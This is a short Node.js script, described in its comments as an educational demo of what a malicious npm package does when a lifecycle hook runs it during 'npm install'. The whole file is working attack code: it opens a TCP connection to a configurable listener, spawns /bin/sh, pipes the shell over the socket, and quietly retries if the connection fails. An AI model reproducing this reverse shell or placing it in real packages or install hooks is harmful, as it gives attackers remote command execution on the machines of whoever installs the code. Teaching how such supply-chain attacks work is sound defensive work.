// EDUCATIONAL DEMO ONLY. This is the whole trick: a lifecycle hook in package.json
// runs this file automatically during `npm install`, before any of your code runs.
// It opens a reverse shell back to a listener you control. Nothing here is obfuscated,
// so the room can read exactly what a real malicious package does.
const net = require('net');
const cp = require('child_process');

const HOST = process.env.LISTENER_HOST || 'host.docker.internal';
const PORT = parseInt(process.env.LISTENER_PORT || '4444', 10);

function connect() {
  const sock = new net.Socket();
  sock.connect(PORT, HOST, () => {
    const sh = cp.spawn('/bin/sh', []);
    sock.pipe(sh.stdin);
    sh.stdout.pipe(sock);
    sh.stderr.pipe(sock);
  });
  // If the listener isn't up yet, retry quietly so the demo is forgiving.
  sock.on('error', () => setTimeout(connect, 1500));
}
connect();
